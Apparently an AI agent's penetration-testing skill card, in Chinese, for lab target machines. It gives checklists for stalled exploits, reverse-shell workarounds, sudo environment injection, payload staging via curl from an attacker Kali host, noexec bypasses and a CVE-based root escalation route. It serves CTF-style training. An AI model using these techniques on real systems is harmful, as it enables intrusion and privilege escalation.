---
name: 'blocking-points-detail'
description: '阻断点细节归档：三问检查表/验证SOP/文件传输/提权优先级路由（按需读取）'
disable-model-invocation: true
metadata: { domain: meta, tier: T2 }
---
> 📌 DSH 用法：用 skill 工具按名加载本卡。

# 阻断点细节：三问检查 / 文件传输 / 提权优先级路由

> 高频查表/流程细节按需加载：T1 卡只留骨架指针，卡点详情查这里。

## 阻断点 3：方向对但操作不通 → 三问检查

### 第一问：触发机制 — 我读了这个脚本的加载逻辑吗？
```text
🔴 文件上传/写入 → 目标服务怎么加载它？
   → cron 轮询? inotify? systemd path unit? 手动触发?
   → 文件名有格式要求吗? (pickle 必须匹配特定文件名)
   → 加载有延迟吗? (30 秒轮询 → 等够时间?)
做法: find / -name "*.py" -o -name "*.sh" -o -name "*.service" | xargs grep -l "watch|poll|inotify|load"
```text
| 陷阱 | 信号 | 检查 |
|------|------|------|
| 文件名精确匹配 | `glob("*.pickle")` / `open("固定名")` | 读脚本确认 |
| 轮询延迟 | `time.sleep(30)` / `Timer` | 等够时间 |
| 权限要求 | `os.access()` | chmod 到一致 |
| 解析器有坑 | pickle 版本 / tar.extractall 过滤 | 本地复现 |

### 第二问：工具行为 — 命令有隐藏行为吗？
| 工具 | 隐蔽行为 | 关键参数 |
|------|---------|---------|
| curl | 折叠 `../` | `--path-as-is` |
| curl | 跟随重定向 | `-L` / `--max-redirect 0` |
| curl | `-d @file` 读本地文件 | 注意 |
| wget | 跟随重定向 | `--max-redirect 0` |
| nc | 大多无 `-e` | mkfifo 或 python3 |
| python requests | 自动 URL-encode | 用 curl 或传 bytes |
| socat | 默认无 PTY | `file:$(tty),raw,echo=0` |
| ssh | 严格 host key | `-o StrictHostKeyChecking=no` |
| evil-winrm | `\` 转义 | 用 `/` 或 `\\` |

### 第三问：系统规则 — sudo/cron/systemd 隐式约束？
| 陷阱 | 信号 | 检查 |
|------|------|------|
| sudo 精确匹配 | `sudo -l` 无 `*` | 裸跑命令 |
| sudo 通配符 | 有 `*` | 可加参数 |
| sudo env_keep | `sudo -l` 有 env_keep | 环境变量注入 |
| cron PATH 极短 | 命令不带路径 | 用绝对路径 |
| AppArmor 白名单 | /tmp 可执行 /var/tmp 不行 | 换 /tmp 或 /dev/shm |
| ProtectHome | systemctl show | grep ProtectHome | 写 /tmp |
| PAM 限制 | sudo/su 被拒 | 查 /etc/security/ |
| 出站防火墙 | 反弹 shell 不通 | 用 443/80/53 |

## 阻断点 3.6：验证 SOP（Browsed 教训 — 防假阴性）

### 成功判定标准先行
```text
🔴 发起利用前写死"成功=可观测副作用"，只按它判定:
   注入 = touch 文件存在 / RCE = out.txt 非空 / 盲打 = 定时回连
   "没看到结果" ≠ 失败（可能是 cwd/回显/路由问题）— 先查环境再判
```text

### 验证前确认执行上下文
```text
🔴 副作用验证前先跑无害命令: pwd && id && ls（确认上下文）
   cwd 不对 = 假阴性（Browsed: 注入写文件失败是 cwd 不在 markdownPreview）
```text

### payload 双环境预检
```text
🔴 先在 Kali 本地验证语法（bash -n / python -c / JSON 校验）→ 再打靶机
   区分"语法错误" vs "靶机拒绝" — 两者处理完全不同
```text

### 错误信息解读 SOP（替代无脑重试）
```text
🔴 每个错误输出回答: "这个错误告诉我什么？" → 再决定下一步
   404           → 路由/路径问题（不是"没执行"）
   Request failed → 先查 detail 字段（mcp_server 已带 detail）
   Permission denied → 身份/权限问题（不是"命令错了"）
   HTTP 000 / timeout → 网络/服务挂（不是 payload 错）
🔴 同一命令重试 ≥3 次 → 必须换解读，禁止盲试
```text

## 阻断点 3.5：文件传输 & 长脚本执行（Cohort 实战沉淀）

> 本地 bash bash 工具 有传输长度限制（Command too long）；PTY 里多行 heredoc 卡死。

### 传输（靶机无外网时）
```text
[1] Kali 起 HTTP: nohup python3 -m http.server <PORT> --directory /tmp >/dev/null 2>&1 &
[2] 靶机下载: curl -s -o /tmp/x http://KALI_IP:PORT/x
[3] 短文件 (<2KB): bash 工具 stdin 传 base64 → echo '<b64>' | base64 -d > /tmp/x
```text

### 执行
```text
🔴 长任务一律: nohup python3 -u /tmp/x.py > /tmp/out.txt 2>&1 & → 轮询 cat
   (python 必须 -u，否则 stdout 块缓冲，重定向文件永远 0 字节)
🔴 交互式程序: python 脚本驱动交互通道 (websocket/pty)，发命令→sleep→读响应循环
🔴 二进制 Permission denied → noexec → cp 到 ~/ 或 /dev/shm
🔴 后台任务: nohup + 输出重定向，避免 PTY 退出杀死子进程
```text

### 反模式
```text
❌ 多行 heredoc (cat >> f << 'EOF') → PTY 卡死
❌ 单命令超传输限制 → MCP Command too long → base64 分块
❌ 前台跑 >30s → MCP Request failed → nohup 后台化
❌ 同脚本多实例并发 → 目标服务连接上限挂起 → 先 pkill
❌ pkill -f <模式> 自杀: 延迟重启脚本命令行含同样模式会被自己 pkill 掉 → 用锚定 pgrep -f "^完整命令$" 取 PID 再 kill
```text

## 提权优先级路由（Cohort 教训）

```text
[1] 用户态 root 服务 (D-Bus activatable + dpkg 版本审计) ← 最容易遗漏！
    → busctl list + dpkg -l 补丁级别 → 搜 "<服务> <版本> CVE 2026"
    → 案例: PackageKit 1.2.8-2ubuntu1.2 → CVE-2026-41651 Pack2TheRoot → SUID bash
[2] sudo / SUID / capabilities / cron（常规面）
[3] 内核 CVE（最后 — 现代靶机通常已缓解/修复）
    → ls /etc/modprobe.d/disable-*.conf（存在 = 已知内核 CVE 已缓解）
    → unprivileged_userns_clone=0 → 需 userns 的内核漏洞不可用
    → 内核版本对比: 发行版 security 页面修复版本（2026 LPE 清单见本机笔记）
🔴 "内核全锁死" ≠ 提权结束 → 切回 [1] 用户态服务面
🔴 部分升级 (同包族 lib 新 daemon 旧) = 漏洞窗口信号
```text

**Why:** 高频查表/流程细节保留在这张深卡里，按需读取比全量加载省上下文。
**How to apply:** 遇到"操作不通/文件传不上/提权选路"时按名加载本卡；T1 卡只留指针。
